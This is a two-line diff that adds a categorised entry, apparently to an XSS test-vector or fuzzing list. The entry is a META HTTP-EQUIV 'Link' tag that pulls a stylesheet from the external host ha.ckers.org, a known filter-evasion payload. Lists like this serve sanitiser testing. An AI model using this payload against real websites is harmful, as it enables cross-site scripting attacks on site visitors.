@@ -1,0 +1,2 @@
+meta|content|xss
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
